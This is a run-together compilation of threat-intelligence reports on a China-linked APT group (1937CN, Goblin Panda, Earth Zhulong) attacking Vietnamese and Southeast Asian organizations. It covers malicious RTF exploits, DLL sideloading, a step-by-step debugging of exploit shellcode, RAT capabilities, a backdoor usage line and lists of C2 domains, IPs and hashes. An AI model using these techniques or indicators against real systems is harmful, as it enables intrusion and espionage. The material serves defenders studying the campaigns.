Recently, FortiGuard Labs came across several malicious documents that exploit the vulnerability CVE-2012-0158. To evade suspicion from the victim, these RTF files drop decoy documents containing politically themed texts about a variety of Vietnamese government-related information. It was believed in a recent report that the hacking campaign where these documents were used was led by the Chinese hacking group 1937CN. The link to the group was found through malicious domains used as command and control servers by the attacker. In this blog, we will delve into the malware used in this campaign and will try to provide more clues as to the instigator of this campaign.
Sample decoy documents
When the documents are opened, they drop several files in one of the following folders:
%AppData%\Microsoft\Credentials
%AppData%\Microsoft\SystemCertificates
%AppData%\Microsoft\Windows\Templates
Some samples drop the following files:
Taskeng.exe – signed legitimate GoogleUpdate.exe version 1.3.33.5
Psisrndrx.ebd – encrypted blob containing malware file
Goopdate.dll – decrypter and loader of malware file
Some drop the following files:
SC&Cfg.exe – signed legitimate McAfee AV application
Vsodscpl.dll – contains the malware file
Others drop the following files:
Systemm.exe - signed legitimate GoogleUpdate.exe version 1.3.30.3
Systemsfb.ebd - encrypted blob containing malware file
Goopdate.dll – decrypter and loader of malware file
Similar to other APT attacks, such as MONSOON APT , this APT uses DLL hijacking to evade the behavior monitoring technologies of security programs.
DLL Hijacking
DLL hijacking is a technique used by some APT malware in which instead of the legitimate application (.exe) loading the benign DLL, the application is tricked into loading a DLL containing malicious code. This technique is employed to evade Host Intrusion Prevention System (HIPS) of security programs that monitor the behaviors of executed files. Most HIPS tools whitelist signed or trusted files, thereby excluding malware loaded using DLL hijacking by signed files from behavior monitoring.
In the context of this attack, taskeng.exe and SC&Cfg.exe are signed legitimate applications; however, they are tricked into loading malware that are disguised as the legitimate Goopdate.dll and Vsodscpl.dll files.
Taskeng.exe and SC&Cfg.exe file information
Next, Taskeng.exe needs to load and import some functions from the original Goopdate.dll file; however, the Goopdate.dll was hijacked to contain malicious code, effectively changing the original code execution to execution of the malicious code.
Snippet from taskenge.exe that loads goopdate.dll
In the same fashion, SC&Cfg.exe imports the “dll_wWinMain” function from the original vsodscpl.dll, but this DLL was hijacked as well, and also contains malicious code.
SC&Cfg.exe import table containing import from vsodscpl.dll
Once the malicious DLLs are loaded, the DLLs decrypt (from psisrndrx.ebd (1 st case) or from its body (2 nd case)) and load a Trojan downloader. The Trojan downloader is a DLL file. It is not dropped on disk but is only executed in memory. Also, the actual Trojan downloader in memory when dumped will not run. This is because the ‘MZ’ in the IMAGE_DOS_HEADER, the DOS stub, and the ‘PE’ signature were deliberately removed. This was done to prevent the dumped file from being analyzed properly in a debugger and decompiler. However, we can easily fix the dump by adding the ‘MZ’, a DOS stub, and the ‘PE’ signature.
Missing header items as anti-analysis
This Trojan downloader downloads a RAT (Remote Access Trojan), which we will call “NewCore” RAT, from the following domains:
web.thoitietvietnam.org
dalat.dulichovietnam.net
halong.dulichculao.com
Trojan Downloader
The Trojan downloader first creates an autostart registry entry so it runs whenever the machine is rebooted:
HKLM/HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Microsoft Windows Media = “%AppData%\Microsoft\Credentials\ .exe”
As an anti-VM, it checks whether the environment has the registry key:
HKCR\Applications\VMwareHostOpen.exe
Before it can download the NewCore RAT, it needs to send the following information to the C&C server:
OS version
Processor speed
Number of processors
Physical memory size
Computer name
User name
User privilege
Computer IP address
Volume serial number
The above information is converted to its hex string representation, and then sent to the C&C server via HTTP GET:
GET request to the C&C server
The response is an XOR encrypted data that includes the encrypted NewCore RAT.
Response from the server
XOR decryption of response from the C&C server
NewCore Remote Access Trojan
We named this RAT ‘NewCore’ after we found the project name used by the author, which is indicated on the following PDB file string:
Malware project name
According to its compilation time stamp, this malware was compiled on March 16, 2017.
Compilation time
However, as of this writing, only a few Antivirus engines, including Fortinet detect this malware according to VirusTotal.
VirusTotal positives
This RAT is a DLL file. Its malicious routines are contained in its imported function “ProcessTrans”. However, executing the DLL without using the downloader will not work as the C&C server string is not embedded in its body. When the downloader calls the function “ProcessTrans”, it supplies to the function the C&C server string and a handle to the C&C server internet session. In this case, Heuristic detection based on behavior will not work on the DLL alone.
This RAT is capable of the following:
Shutdown the machine
Restart the machine
Get disk list
Get directory list
Get file information
Get disk information
Rename files
Copy files
Delete files
Execute files
Search files
Download files
Upload files
Screen monitoring
Start command shell
Shutdown and restart machine commands
File manager, monitor screen, command shell commands
File manager subcommands
Based on the strings found in its body, this malware may have been derived from the PcClient and PcCortr backdoors whose source codes are publicly available, especially on Chinese language coding forums. PcClient detections usually include PcCortr.
Strings related to PcCortr modules
PcClient and PcCortr source codes can be downloaded from Chinese coding forums
PcClient was used in the past by some APT groups such as Nitro , which were also linked to a China-based hacker.
According to the PDB file string embedded in the NewCore RAT body, the creator of the project is someone using the handle “hoogle168”.
We have little clue as to who this individual is, so we tried to look for information about this handle. Our investigation led us to several Chinese language forum pages. Looking at these forums, it seems like a user using the handle “hoogle168” is very active on a certain coding forums, and is proficient in C and VC++. This user even replied to a thread and gave advice on what to learn to develop remote control software. We don’t know for sure if this person is the NewCore author.
Solution:
To prevent triggering this RTF exploit, it is important to apply the patches released by Microsoft that cover CVE-2012-0158 vulnerability.
Fortinet also covers detection for these threats as MSOffice/Dropper!exploit.CVE20120158 for the malicious RTF files, and W32/NewCore.A!tr.bdr for the payload.
C&C URLs were also blocked using Fortinet's FortiGuard Web Filtering .
Conclusion :
NewCore RAT may just be a rehashed PcClient RAT, but it proves to be effective in evading AV detection by using a combination of simple techniques such as DLL-hijacking, file-less execution of downloaded malware, and passing C&C information as parameter from downloader to the downloaded file.
As always, Fortiguard Labs will keep an eye on threats like NewCore to protect our customers against these threats.
Thank you to Tien Phan for additional insights.
-= FortiGuard Lion Team =-
IOCs:
Lure :
2a4e8ae006be3a5ed2327b6422c4c6f8f274cfa9385c4a540bc617bff6a0f060
3faacef20002f9deb1305c43ea75b8422fd29a1559c0cf01cf1cee6a1b94fc0e
5bdbf536e12c9150d15ae4af2d825ff2ec432d5147b0c3404c5d24655d9ebe52
14b4d8f787d11c7d72f66231e80997ef6ffa1d868d9d8f964bea36871e1c2ff2
637c156508949c881763c019d2dca7c912da9ec63f01e3d3ba604f31b36e52ab
5573f6ec22026b0c00945eec177f04212492bb05c33b4b80f73c65ce7fe5119a
00466938836129a634b573d2b57311200ab04aba7252cfbf6b77f435612ca6c6
c375946ba8abee48948f79a89ea5b4f823d8287c2feb3515755b22ba5bd8849d
f6a4bab7d5664d7802f1007daa04ae71e0e2b829cd06faa9b93a465546837eb4
fabf4debacb7950d403a84f4af25c084d0b576783006d334052ebf7ea432196e
Loader :
9cebae97a067cd7c2be50d7fd8afe5e9cf935c11914a1ab5ff59e91c1e7e5fc4
ea5b3320c5bbe2331fa3c0bd0adb3ec91f0aed97709e1b869b79f6a604ba002f
Trojan Downloader :
edbcc384b8ae0a2f52f239e2e599c3d2053f98cc1f4bc91548ec420bec063be6
49efab1dedc6fffe5a8f980688a5ebefce1be3d0d180d5dd035f02ce396c9966
df8475669a14a335c46c802f642dd5569c52f915093a680175c30cc9f28aacdb
NewCore RAT :
37bd97779e854ea2fc43486ddb831a5acfd19cf89f06823c9fd3b20134cb1c35
Command and Control Servers :
web.thoitietvietnam.org
dalat.dulichovietnam.netMalicious document targets Vietnamese officials After our investigation of APT SideWinder, we’ve done a yara rule for hunting RTF document exploiting the CVE-2017–11882. We found a document written in Vietnamese dealing with a summary about differents projects in the district Hải Châu of Đà Nẵng. RTF document In this article, we’ll detail the infection chains and the infrastructures of the attackers and the TTPs of this campaign. The infrastructures and TTPs during this campaign seem to the Chinese hacking group 1937CN. Infection chains Joe sandbox has a good representation of the behaviour of the infection. This rtf document is really malicious and it exploits the equation vulnerability to write two files in the system:
A dll named RasTls.dll
A executable file named dascgosrky.exe
This document is interesting to analyze so let’go ! RTF analysis With rtfobj, we found three ole objects in the document: two non well formed ole object and a third named package ole object. The package ole object is used to write a file in the disk when the document is opened at the destination described by the ole object. That’s why, there is a path and a name in the ole object. Package OLE Object This technique is used to execute code like sct file to download an executable on the operating system. McAfee labs has detailed all this stuff with sct file: https://securingtomorrow.mcafee.com/mcafee-labs/dropping-files-temp-folder-raises-security-concerns/ Many attackers use it in the wild because it’ very easy to use and it’ supported by the office software with RTF files. So, in our case, a file named 8.t is dropped on %TMP% folder. If we check it, it’s clearly encrypted. 8.t encrypted The others object ole seem to the exploit of CVE-2017–11882. Equation Ole Object At the end of the object ole, we have differents API functions to make a runPE. Another interesting thing is this string at the begin of the object: 7e079a2524fa63a55fbcfe String found in many exploits of CVE-2017–11882 We have the same string used by APT SideWinder in the equation object ole. It’s the same toolset to create the malicious document. So now, we have to debug the malicious document to find how the file 8.t is used and find this runPE. Debugging of the shellcode At the start of the analysis, we think the process EQNEDT32.exe is created by Winword.exe using the function CreateProcess. So we decided to set a breakpoint at the call of his function. But EQNEDT32.exe is invoked by Winword.exe using COM Object. It’s not CreateProcess that used and Winword.exe is not the parent process of EQNEDT32.exe. So we have to attach the debugger when EQNEDT32.exe is launched. For that, we used a technique named Image File Execution Options that was documented by Microsoft. https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/ We create a key EQNEDT32.exe. Registry HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options And we set a value string for launching the debugger when EQNEDT32.exe is executed and attaching the debugger to the process . Value to set the debuuger when EQNEDT32.exe is executed When we open the rtf document, Winword is launched and EQNEDT32.exe also. Winword process EQNEDT32.exe process attached by the debugger And the debugger is attached at the entrypoint of EQNEDT32.exe. We check if it’s 8.t is correctly created in the %TMP% folder. 8.t dropped on disk Now we set a breakpoint at the createFile to check if the shellcode of the exploit reads the file 8.t. CreateFile is called at call eqnedt32.41E5EE. The param of the path of file is pushed on the stack push dword ptr ss:[ebp-4]. The shellcode uses CreateFile to the 8.t in the %TMP% folder So now, we can return of the user code at the calling function. After a step into, we enter in the shellcode, the address space has changed: Shellcode of the exploit After CreateFile, GetFileSize is called to have the size of the file Get the size of the file After is Virtualloc, and it create a memory page at 1FD0000 (eax value) VirtualAlloc memory page to load 8.t After virtualAlloc, the memory page is pointed by EAX The page allocated ReadFile is called: Readfile 8.t And 8.t is loaded at 1FD0000: 8.t in memory And the shellcode decrypts the 8.t file in memory at 0066C82A. The loop of decryption is a xoring with different manipulations on the decryption key. At the start of the decryption the key is set to 7BF48E63. Decryption loop And the xor is made after key manipulation. Set the decryption key in EAX If we check the destination of the result of the xoring (here edx + ebx), we find 01FD0000 where 8.t is loaded. After two step of the loop, we can see the magic number MZ set at the begin of memory section. MZ magic number At the end of the decryption loop, we have a PE in memory at 01FD0000. the file 8.t has been decrypted. 8.t fully decrypted Then, the shellcode uses the VirtualAlloc and create a memory page at 02070000. And the new PE at 01FD0000 is copied at this address. the PE decrypted is copied in the new memory page After GetModuleFileNameA is called to have the path of EQNEDT32.exe And EQNEDT32.exe is forked in suspend status by a CreateProcess and the shellcode overwrite it by the PE at the address 02070000 Fork of EQNEDT32.exe Overwritting of EQNEDT32.exe Stack used by NTWriteVirtualMemory And the shellcode does a ResumeThread to launch the new PE. So, We’ve found all API Calls in the object ole at the beginning and we have a runPE to launch the new EQNEDT32.exe overwritten. Analysing the fork of EQNEDT32.exe We know that this process has to create on disk two files following the Joe SandBox Analysis:
A dll named RasTls.dll
A executable file named dascgosrky.exe
If we dump EQNEDT32.exe and we put in IDA, we found quickly the function that drops the files on disk (sub_00401150) renamed dropFiles. DropFiles Fucntion And at the start of this functions, we have a loop with a xor. Second loop of decryption And just after we have a call of the decompression function. Decompression function used zlib The function dropFiles is called twice by the sub_4012D0. Drop the dll and the executable If we check the call graph, DropFiles is called only by the function sub_4012D0. Functions using DropFiles function So we set a breakpoint on CreateFile because at each execution, EQNEDT32.exe starts by CreateFile onstaticcache.dat. Breakpoint to createfile And we return at the user code to set a new breakpoint to check the static analysis. So we set a breakpoint at 0040159A when DropFiles is called. Breakpoint to the first call of DropFiles And now we can analyse the second loop of decryption. The first step is the initialization of the decryption function. Set for the second loop encryption And after we find the xor and store the result in esi+eax. Decryption loop In the first step of the decryption loop, the result is written to 411BC0 in the address space of EQNEDT32.exe. Before the decryption After tree loops, we obtains the header of zlib compressed object. After the decryption And at the memory page 021E0000, a PE is decompressed. Page memory allocated to store the dll After decompression And after the file is created with the following path: L”C:\\Users\\IEUser\\AppData\\Roaming\\Microsoft\\Windows\\Network Shortcuts\\RasTls.dll” Stored by ebx. DropFiles is called a twice to decrypt and decompress the executable file. The offset where store the file is 00434EF8 and the pe decompressed is stored at 025D0020 Decryption of the executable dascgosrky.exe And the path of the new file is : ebx=005DA228 L”C:\\Users\\IEUser\\AppData\\Roaming\\Microsoft\\Windows\\Network Shortcuts\\dascgosrky.exe” So we have two files in networks shortcuts of Windows. Files drops on disk dll hijacking Dascgosrky.exe is a legit and trusted software develop by Symantec. To load the library RasTls.dll, the executable calls LoadLibrary and GetProcaddress in sub_401940 to execute the malicious functions Dascgosrky.exe loading the malicious The original file If we check the exports in IDA, we just have a dllentrypoint. The dll is executed like this. We’ll analyse the RAT in the second Part. Infrastructure of Attackers The domain contacted is wouderfulu.impresstravel.ga and this domain resolved on 192.99.181.14. Domain wouderfulu.impresstravel.ga This IP has differents domains found with PassiveTotal and theses domains is recorded in the IP 176.223.165.122. Many domain names is used for Vietnameses people. Expansion of domains There are two domains really interesting: Halong.dulichculao.com is already used in the campaign targeting Vietnameses organizations. https://www.fortinet.com/blog/threat-research/rehashed-rat-used-in-apt-campaign-against-vietnamese-organizations.html For Fortinet is the Chinese hacking group 1937CN. If we compare the TTPs, it’s really similar. They used RTFs to make the intrusion and dll hijacking to load the real payload. And the name of domains are really similar between the campaings. The second one is: Cat.toonganuh.com is a subdomain of tooganuh.com recorded by florence1972@scryptmail.com Conclusion The Chinese hacking group 1937CN continues to target Vietnam officials with the same TTPs with a refreshing on the tools used. The toolset used by this group to create RTF malicious document has the same properpy of the SideWinder. I want to thank my buddies on “Zone de Confort”. It’s with this dreamteam, I can finalize correctly this analyses. In the second part, we analyze the RAT using in this campaign. Or if another reverse can make that, I’ll paid a beer ;) IOCs for the paper: domains:
dn.dulichbiendao.org
gateway.vietbaotinmoi.com web.thoitietvietnam.org
hn.dulichbiendao.org
halong.dulichculao.com
cat.toonganuh.com
new.sggpnews.com
dulichculao.com
coco.sodexoa.com.
thoitiet.malware-sinkhole.net
wouderfulu.impresstravel.ga
toonganuh.com
coco.sodexoa.com IPs:
192.99.181.14
176.223.165.122 RTFs: 42162c495e835cdf28670661a53d47d12255d9c791c1c5653673b25fb587ffed 8.t: 2c60d4312e4416745e56048ee35e694a79e1bc77e7e4d0b5811e64c84a72d2d7 PE: f9ebf6aeb3f0fb0c29bd8f3d652476cd1fe8bd9a0c11cb15c43de33bbce0bf68 (exe) 9f5da7524817736cd85d87dae93fdbe478385baac1c0aa3102b6ad50d7e5e368 (dll) Update: The payload is PlugX. Thanks to Gabor Szappanos https://twitter.com/GaborSzappanos/status/1024622354582908928 Update IOCs: 597c0c6f397eefb06155abdf5aa9a7476c977c44ef8bd9575b01359e96273486 59.rtf
11f38b6a69978dad95c9b1479db9a8729ca57329855998bd41befc364657d654 RasTls.dll
f9ebf6aeb3f0fb0c29bd8f3d652476cd1fe8bd9a0c11cb15c43de33bbce0bf68 RasTls.exe b70069e1c8e829bfd7090ba3dfbf0e256fc7dfcefc6acafb3b53abcf2caa2253 b7.rtf
77361b1ca09d6857d68cea052a0bb857e03d776d3e1943897315a80a19f20fc2 spoolsver.exeAdversary Playbook: The FortiGuard SE Team is releasing this new playbook on the threat actor group known as Goblin Panda as part of its role in the Cyber Threat Alliance. For more information regarding this series of adversary playbooks being created by CTA members, please visit the Cyber Threat Alliance Playbook Whitepaper .
Active since 2014, Goblin Panda is a threat actor that is focused on interests in Southeast Asia. Goblin Panda has been documented by various organizations, including Fortinet , over the past several years. Due to non-standardized naming conventions within the industry, Goblin Panda is also known as APT 27, Hellsing, Cycledek, and perhaps 1937CN. Goblin Panda is primarily active in South and Southeast Asia, with activity seen primarily in Cambodia, Indonesia, Philippines, Myanmar, Malaysia, Thailand, and Vietnam. India has also been targeted in the past, albeit in limited numbers.
Not much has been documented on this group for various reasons. This is primarily due the fact that its tactics, techniques, and procedures have evolved over the years, and also because rather than engaging in the sort of broad-brush attacks most cybercriminal gangs engage in, their targets and campaigns have been quite specific in nature. We hope that the information contained within our playbook is informative for responders who encounter one of their attacks, or for anyone interested in Goblin Panda.
Overview
Favorite methodologies of Goblin Panda include the use of remote access Trojans, including the infamous PlugX/Korplug, NewCore, and Sisfader RAT tools. Distribution of infected samples are often used by attackers such as Goblin Panda through weaponized Microsoft Office documents containing malicious macros, or by exploiting known vulnerabilities—most recently CVE-2012-0158 and CVE-2017-11882. Even though CVE-2012-0158 is over five years old, attackers are quite aware that many organizations, especially up and coming organizations in developing areas of the world, do not follow a regular patching schedule for various reasons, such as lack of resources or awareness, and therefore remain vulnerable to know exploits for long periods of time.
Methodology
Observed instances of Goblin Panda activity have generally started with a spearphishing attacks via a maliciously crafted Microsoft Office document. When the document is opened by the victim, various files are dropped into different locations of the victim’s PC. Dropped files include legitimate software vendor files, an encrypted binary blog containing the payload, and DLL files containing the decryptor and loader for the payload.
During the installation of the malware, a DLL hijacking technique to evade traditional antivirus detections is used whereby a variety of legitimate DLL files from different vendors are hijacked using a Trojanized version of a malicious DLL file. Once the malicious DLL file is side loaded, it then downloads the Trojan downloader, which in turn sets a run key in the registry for persistence. Typically, a legitimate program requires libraries to properly execute. DLL sideloading/hijacking attacks makes the legitimate program think it is loading the correct DLL, when in reality it is loading the malicious DLL instead. Finally, it also checks to determine if it is running in a VM environment.
Once it is finished with those tasks, it then sends various parameters to a C2 server, including:
· OS version
· Processor speed
· Number of processors
· Physical memory size
· Computer name
· User name
· User privilege
· Computer IP address
· Volume serial number
When all of those parameters are deemed ok, it then downloads a payload. In most recent cases, that payload has been the NewCore RAT (Korplug/Plugx and Sisfader were seen in prior campaigns). The NewCore RAT is a malicious DLL file. However, executing the DLL without using the downloader will not work as the C&C server string is not embedded within the DLL file. Based on the strings found in its body, this malware may have been derived from the PcClient and PcCortr backdoors whose source codes are publicly available, especially on Chinese language coding forums.
NewCore RAT has the following attributes:
· Copy files
· Delete files
· Execute files
· Search files
· Download files
· Upload files
· Retrieve disk list
· Retrieve directory list
· Retrieve file information
· Retrieve disk information
· Rename files
· Screen monitoring
· Start command shell
· Shutdown/Reboot
We have also encountered several new NewCore RAT samples that may have been used by the Goblin Panda threat actors. However, due to time constraints we were unable to analyze them further to see if there is an absolute connection to the threat actor group. The following IOCs have been provided for information purposes. Please see the Indictors of Compromise section below for further details, along with our playbook viewer , which contains the tactics and techniques defined by the Mitre ATT&CK knowledge base.
For a detailed technical overview, read our previous blog: Rehashed RAT Used in APT Campaign Against Vietnamese Organizations
Indicators of Compromise
All samples (IOCs) have been provided in good faith. These samples had not been analyzed at the time of publication due to time restrictions. As a result, there are no guarantees made about the samples below with respect to Goblin Panda or any attributions to any threat actor.
(NewCoreRat Samples)
9d4ffae7a398a3aef1cef30da784ded0764c50099d3891291f4688aec35fe48
1d8ad2bf967aff93c713a729d5e9447700a236bde1af616bbe6f51e21bdad8c5
281f3ce73e434f7616ce1600e0d6cab335ecdff2778dac0f916cc0e65224a753
b93b7ad0e27d95665b699c3f6cf49129cff410555defd2c56cd3ec8a112bf1c9
Read and learn more about the Cyber Threat Alliance (CTA).Chinese State-Sponsored Cyber Espionage Activity Supports Expansion of Regional Power and Influence in Southeast Asia
December 8, 2021 •
Insikt Group®
China
Editor’s Note : The following post is an excerpt of a full report. To read the entire analysis, click here to download the report as a PDF.
This report profiles trends in Chinese state-sponsored cyber espionage activity targeting Southeast Asian countries. The activity was identified through large-scale automated network traffic analytics and expert analysis. Data sources include the Recorded Future Platform, SecurityTrails, DomainTools, PolySwarm, Farsight, Team Cymru, and common open-source tools and techniques. The research will be of most interest to individuals engaged in strategic and operational intelligence relating to the activities of Chinese military and foreign intelligence agencies in cyberspace and network defenders with a presence in Southeast Asia.
Executive Summary
Recorded Future’s Insikt Group tracks Chinese state-sponsored cyber espionage operations targeting government and private sector organizations across Southeast Asia. In this report, we highlight multiple examples of activity reported to Recorded Future clients throughout 2021. The identified intrusion campaigns almost certainly support key strategic aims of the Chinese government, such as gathering intelligence on countries engaged in South China Sea territorial disputes or related to projects and countries strategically important to the Belt and Road Initiative (BRI).
The activity highlighted includes a group we track as Threat Activity Group 16 (TAG-16 ), which has compromised several high-profile military and government organizations across Southeast Asia throughout 2021 using custom malware families such as FunnyDream and Chinoxy. Many of the governments targeted by TAG-16 are engaged in ongoing disputes with China over territorial claims in the South China Sea. Additionally, we highlight 2 separate suspected Chinese state-sponsored intrusion campaigns targeting entities in Laos and Cambodia. Both are likely intended to support BRI objectives. Victims in these 2 respective campaigns include the National Committee for Special Economic Zones (SEZs) and National Enterprise Database (NED) in Laos and Cambodia’s Sihanoukville Autonomous Port (PAS).
Key Judgments
Our research highlights China’s continued strategic and tactical interest in government and private sector organizations in Southeast Asia. This targeting is almost certainly linked to a range of objectives intended to support a deepening of regional influence, including traditional intelligence gathering against regional rivals and allies, economic intelligence gathering against BRI-linked targets, and the South China Sea disputes.
The operational tasking of TAG-16 is likely linked, in part, to gathering intelligence on South China Sea-related issues. Notably, Insikt Group identified the compromise of navies, prime minister’s offices, ministries of defense, and ministries of foreign affairs across several countries with a presence in the South China Sea.
The targeting of Cambodia’s Sihanoukville Autonomous Port and Laos’s National Committee for SEZs is likely linked to China’s wider strategic objectives under the BRI. PAS has high strategic significance given its location along the Maritime Silk Road route, while the Lao government has promoted the development of SEZs as an entry point for private sector development, including domestic and foreign direct investment (FDI).
Editor’s Note : This post was an excerpt of a full report. To read the entire analysis, click here to download the report as a PDF.Introduction
In 2022, we discovered a hacking group that has been targeting telecom, technology, and media sectors in Vietnam since 2020. We track this particular group as Earth Zhulong. We believe that Earth Zhulong is likely related to the Chinese-linked hacking group 1937CN based on similar code in the custom shellcode loader and victimology.
In this post, we’ll introduce Earth Zhulong’s new tactics, techniques, and procedures (TTPs) in the recent campaign and the evolution of their custom shellcode loader, “ShellFang”. Through the TTPs, we see that they are sophisticated and meticulous as malicious actors. They adopt multiple approaches to obfuscate their tools and eliminate their footprint after finishing the operation. As a result, we have exerted greater effort to hunt down and analyze their tools to fully understand the attack scenario. In addition, we have verified three different variants of ShellFang were used from 2020 to 2022. The latest variant demonstrates that threat actors have adopted more obfuscation techniques, including abusing exception mechanisms to obfuscate the execution flow of programs and Windows API hashing.
In early 2022, we further discovered that Earth Zhulong abused group policy objects (GPO) to install loaders and launch Cobalt Strike on their target hosts. Several hack tools were also found on the infected hosts, including tunneling, port scanning, a Go-lang based backdoor and an information stealer used to harvest internal information.
Compared to old variants, code structure in the latest variant is dramatically different and there are few shared features between old and the latest variant. However, we found the relationship during the long-term investigation and finally correlated old variants with the latest one. We believe the relationship found in this research could bring this notorious hacking group back to public sight and the findings here will be helpful to future research on hacker groups which are active in Southeast Asia.
Initial Access – Lure document
Back in 2020, through the command and control (C&C) domain observed in our investigation, we found a lure document with a malicious macro. Once the victim opens the document, the embedded macro will be executed, injecting the shellcode into rundll32.exe. We have identified the embedded shellcode as a Cobalt Strike shellcode which will be used to build connection to a remote hacking machine. We believe this lure document is one of the approaches used by the threat actors to compromise their targets.
Propagation through GPO
In early 2022, we further observed new TTPs used to spread malware in the victim’s environment. After getting access to the internal network, they perform domain exploration using SharpHound. Once they successfully compromise the domain controller, they will submit immediate tasks to the hosts in the domain through GPO as seen in Figure 5, As the hosts receive the task through GPO, they will run a PowerShell script named “co.ps1” and create scheduled tasks for persistence.
As shown in Figure 6, threat actors use multi-layered AES encryption and base64 encoding to obfuscate “co.ps1”. Heavy obfuscation in a simple but useful anti-analysis approach makes it difficult for security products to detect their scripts. After clearing the obfuscation, we found the script is used to deploy malware components (win.exe, gm.dll, and lengs.medil.xml) on the infected machine.
Earth Zhulong adopted DLL sideloading techniques to run their malware. “win.exe” is a renamed GoogleToolbarNotifier application. The malicious DLL “gtn.dll”, which we named as “ShellFang”, loads when a legitimate executable is launched. It then calls the export function, “Go”, to start the loading procedure of the encrypted payload to decrypt the payload called “lengs.medil.xml”, which is the Cobalt Strike beacon.
Evolution of ShellFang loader
During the investigation, we found that Earth Zhulong started targeting the telecommunication and media sectors in Vietnam in 2020. Although they always used DLL sideloading to launch their malware, they never stopped changing the code structure of their shellcode loader. Here we summarize the information we collected from 2020 to 2022 and verify three different variants used by Earth Zhulong.
Loader prior to 2020 (Variant 1)
The earliest variant of ShellFang was observed in a victim’s environment in 2020. However, based on the timestamp of export function, this variant was compiled in 2017. The code structure of ShellFang is simple. It would read the encrypted payload (“nkford.nlp” is the payload in this case) then decrypt it and run it in the memory. The shellcode loader used XOR with a 26 byte keyset and started a long sleep after finishing shellcode execution.
Loader in 2021 (Variant 2)
Compared to the variant in 2020, there was no big change in 2021. They changed the decryption function into RC4 instead of the original XOR, but the code structure was basically the same as the previous variant.
Loader in the latest campaign (2022, variant 3)
Compared to previous variants, changes were seen in the code structure in variant 3. In this variant, more anti-analysis techniques were added to strengthen their loader, including API hashing and execution flow obfuscation through exception mechanism. Threat actors intentionally raise exceptions to interrupt malware analysts and obfuscate the execution flow of the program. Windows APIs are obfuscated via a hashing function and dynamically resolved in the run-time. The payload will be decrypted with RC4 algorithm, and the final payload is an HTTPs Cobalt Strike beacon.
Hacking Tools
Besides the shellcode loader and Cobalt Strike, we also observed additional tools, including port scanner, proxy and information stealer deployed to the compromised hosts. It’s worth noting that they use various programming platforms including C language, Golang and Python. In this section, we will mention some noteworthy hacking tools used in their operation.
MACAMAX
Although threat actors already installed the Cobalt Strike as backdoor, we also found out that they deployed another Go-Lang backdoor, which we named MACAMAX in the meantime. It supports proxy (Socks5), upload/download file and remote shell functions. Network configuration was defined in another configuration file, and it would be loaded when running the backdoor. Furthermore, the configuration file will be deleted once it is loaded into memory for fear of leaking network infrastructures.
cmd> {MACAMAX}.exe {network config file}
Usage of MACAMAX
-rh={remote host} -rp={remote port} -ps={proxy server} -sl=5 -to=0 -cg=1
Information defined in the configuration file.
Themida-packed EarthWorm
During our investigation, we found they also use the notorious network-penetration tool, “EarthWorm”. EarthWorm is a simple network tunnel tool with SOCKS v5 server and port transfer developed by a Chinese engineer. Although the original developer already stopped maintenance and removed the download link, it’s still getting more popular in the recent cyber-attack. With this tool, the attackers are able to bypass the firewall and access the machine in a restricted network. Since EarthWorm has become more common, security vendors also provide solutions to detect this powerful tool. In order to avoid being detected by security products, threat actors use Themida packer to obfuscate the signature used for detection.
Information Stealer
We found a python-based information stealer used to collect internal information of victims. This information stealer is compiled with Python 3.10 and packed by noted tools, “PyInstaller”, used to convert python script to be a standalone executable. After checking the Python assembly code of the sample, we found this tool is used to dump information from the victim’s Oracle database. Dumped data will be stored in a csv file and compressed by WinRAR with a password (“5tgb6yhn”), then all compressed data will be uploaded to Dropbox at the end.
Footprint Hidden and Elimination
Threat actors run PowerShell scripts with previous versions of PowerShell that do not support Script Block Logging with the intent to evade being detected while running the malicious scripts (so-called “Downgrade Attack”). After finishing the operation, they will clean the intrusion footprint and delete important files, including payload and network configuration files, to avoid leaking any information to analysts. It is worth noting that they also corrupt their shellcode loader by wiping out the header of the file, seen in Figure 15. This is a common approach to make it harder for analysts to analyze their tools in the ransomware attack, but it’s relatively rare in an APT attack. These show that they are sophisticated and meticulous actors.
Attribution
Summarizing the information collected from 2020 to 2022, we find that Earth Zhulong is likely to be related to a notorious hacking group in Vietnam, “1937CN” based on the code similarity and victimology aspects. In this section, we will introduce the process of attribution.
Code similarity
Although the earliest variant of ShellFang used in this campaign was observed in 2020, we found the malware was already compiled in 2017, based on the timestamp of an export function, which can be seen in Figure 19. In addition, we reviewed reports published around that time and found the decryption algorithm in ShellFang was once used in the campaign by 1937CN, which was revealed by Fortinet in 2017. Shown in Figure 20, the XOR keyset and algorithm are highly similar. Based on the prevalent time and algorithm, we believe Earth Zhulong is likely to be related to 1937CN.
Figure 20. The left is the algorithm revealed by Fortinet in 2017. The right one is found in the earliest ShellFang variant.
Victimology
Based on our long-term investigation, Vietnam is Earth Zhulong’s major target, focusing on telecom and media sectors. 1937CN is a well-known hacking group in Southeast Asia and Vietnam is always their major target as well. In 2016, 1937CN was suspected to attack Noi Bai and Tan Son Nhat airports in Vietnam, hijacking the flight information screens to broadcast anti-Vietnamese and anti-Philippines propaganda. In 2017, Fortinet also revealed their campaign targeting Vietnam organization by using a weaponized RTF document. In victimology aspects, Earth Zhulong is consistent with the 1937CN group.
Conclusion
Through long-term monitoring, we found this campaign continued targeting Vietnam from 2020 to 2022. In the past 2 years, they always have used DLL sideloading as their major technique to launch their malware. However, they continued updating their tools and even added more anti-analysis techniques in their latest tools including multi-layer obfuscation, API obfuscation, and execution flow obfuscation by raising exceptions intentionally.
We also found they compromise the domain controller in the victim’s environment and deployed Cobalt Strike on their hosts by creating immediate tasks through GPO. In addition, Go-lang and Python are also used as programming languages to build their tools. Both programming languages provide strength for cross-platform programs development. Furthermore, Python and Go-lang executables usually compile all necessary libraries in a single binary, making malware classification more difficult for analysts and resulting in a large binary. Some security products have limitations when handling large files. Which may be their approach as large binaries reduces the risk of being detected.
In the process of tracking and analyzing the data, we have identified the hacker group behind the campaign which targets organizations in Vietnam, and called it Earth Zhulong. Based on the victimology and usage of a highly similar decryption algorithm, we believe that Earth Zhulong is related to the hacking group known as “1937CN”. We hope our findings will remind the public that the actions and motivations of 1937CN continue to resurface through groups like Earth Zhulong, and that these groups remain a big threat to cybersecurity in Southeast Asia.
